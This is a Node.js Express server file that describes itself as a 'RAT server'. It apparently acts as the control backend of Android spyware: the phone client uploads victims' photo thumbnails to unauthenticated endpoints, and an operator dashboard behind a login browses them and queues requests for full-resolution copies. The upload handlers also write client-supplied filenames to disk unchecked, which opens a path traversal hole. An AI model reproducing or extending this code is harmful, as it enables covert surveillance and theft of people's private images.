require('dotenv').config();
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const app = express();
const port = 5000;

// ─── Auth config ────────────────────────────────────────────────────

const ADMIN_USER = (process.env.ADMIN_USERNAME || '').trim();
const ADMIN_PASS = (process.env.ADMIN_PASSWORD || '').trim();

if (!ADMIN_USER || !ADMIN_PASS) {
    console.error('❌ Missing ADMIN_USERNAME or ADMIN_PASSWORD in .env file');
    process.exit(1);
}

// ─── Middleware ─────────────────────────────────────────────────────

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000  // 24 hours
    }
}));

// ─── Auth middleware ────────────────────────────────────────────────

function requireAuth(req, res, next) {
    if (req.session && req.session.authenticated) {
        return next();
    }
    // If requesting HTML page, redirect to login
    if (req.accepts('html')) {
        return res.redirect('/login');
    }
    // API calls get 401
    res.status(401).json({ error: 'Unauthorized' });
}

// ─── Directories ────────────────────────────────────────────────────

const uploadDir = './uploads';
const fullResDir = './full_res';

if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
if (!fs.existsSync(fullResDir)) fs.mkdirSync(fullResDir, { recursive: true });

// ─── Request queue (in-memory + file persistence) ───────────────────

const requestsFile = path.join(uploadDir, 'requests.json');
let pendingRequests = [];

if (fs.existsSync(requestsFile)) {
    try {
        pendingRequests = JSON.parse(fs.readFileSync(requestsFile, 'utf8'));
    } catch (e) {
        pendingRequests = [];
    }
}

function saveRequests() {
    fs.writeFileSync(requestsFile, JSON.stringify(pendingRequests, null, 2));
}

// ─── Auth routes (public) ───────────────────────────────────────────

app.get('/login', (req, res) => {
    // If already logged in, redirect to dashboard
    if (req.session && req.session.authenticated) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'web_ui', 'login.html'));
});

app.post('/auth/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        req.session.authenticated = true;
        // console.log('🔓 Dashboard login successful');
        res.json({ success: true });
    } else {
        // console.log('🔒 Failed login attempt');
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});

app.post('/auth/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ─── Android client API (no auth required) ──────────────────────────

app.get('/api/ping', (req, res) => {
    res.json({ status: 'ok' });
});

app.post('/api/upload/thumbnail', (req, res) => {
    try {
        const { filename, thumbnail } = req.body;
        const thumbnailData = thumbnail.split(',')[1] || thumbnail;
        const buffer = Buffer.from(thumbnailData, 'base64');

        const thumbPath = path.join(uploadDir, filename + '_thumb.jpg');
        fs.writeFileSync(thumbPath, buffer);

        const metaPath = path.join(uploadDir, filename + '.metadata.json');
        fs.writeFileSync(metaPath, JSON.stringify({
            originalName: filename,
            thumbnailPath: filename + '_thumb.jpg',
            uploadedAt: new Date().toISOString()
        }, null, 2));

        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading thumbnail:', error);
        res.status(500).json({ success: false, error: 'Failed to upload thumbnail' });
    }
});

app.post('/api/upload/fullsize', (req, res) => {
    try {
        const { filename, image } = req.body;
        const imageData = image.split(',')[1] || image;
        const buffer = Buffer.from(imageData, 'base64');

        const fullPath = path.join(fullResDir, filename);
        fs.writeFileSync(fullPath, buffer);

        console.log('🖼️  Full-res saved to ./full_res/' + filename + ' (' + Math.round(buffer.length / 1024) + ' KB)');
        res.json({ success: true, filename });
    } catch (error) {
        console.error('Error uploading full image:', error);
        res.status(500).json({ success: false, error: 'Failed to upload full image' });
    }
});

app.get('/api/requests', (req, res) => {
    res.json({ requests: pendingRequests });
});

app.delete('/api/request/:filename', (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    pendingRequests = pendingRequests.filter(f => f !== filename);
    saveRequests();
    res.json({ success: true });
});

// ─── Dashboard API (auth required) ──────────────────────────────────

app.get('/api/thumbnails', requireAuth, (req, res) => {
    try {
        const files = fs.readdirSync(uploadDir);
        const thumbnails = [];

        files.forEach(file => {
            if (file.endsWith('_thumb.jpg')) {
                const metaFile = file.replace('_thumb.jpg', '.metadata.json');
                let metadata = { originalName: file.replace('_thumb.jpg', '') };

                try {
                    metadata = JSON.parse(
                        fs.readFileSync(path.join(uploadDir, metaFile), 'utf8'));
                } catch (e) {}

                const hasFullRes = fs.existsSync(
                    path.join(fullResDir, metadata.originalName));
                const isPending = pendingRequests.includes(metadata.originalName);

                thumbnails.push({
                    name: metadata.originalName,
                    thumbnail: file,
                    uploadedAt: metadata.uploadedAt,
                    hasFullRes,
                    isPending
                });
            }
        });

        thumbnails.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
        res.json({ thumbnails });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to fetch thumbnails' });
    }
});

app.post('/api/request/:filename', requireAuth, (req, res) => {
    const filename = decodeURIComponent(req.params.filename);
    if (!pendingRequests.includes(filename)) {
        pendingRequests.push(filename);
        saveRequests();
        console.log('📋 Full-res requested:', filename);
    }
    res.json({ success: true, pending: pendingRequests.length });
});

// ─── Dashboard (auth required) ─────────────────────────────────────

app.use('/uploads', requireAuth, express.static(uploadDir));
app.use('/full_res', requireAuth, express.static(fullResDir));

app.get('/', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'web_ui', 'index.html'));
});

app.get('/style.css', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'web_ui', 'style.css'));
});

// ─── Server startup ─────────────────────────────────────────────────

app.listen(port, '0.0.0.0', () => {
    console.log('🐀 RAT server running at http://localhost:' + port);
    // console.log('🔐 Dashboard protected — login at /login');
});

process.on('SIGINT', () => {
    console.log('Shutting down server...');
    process.exit(0);
});
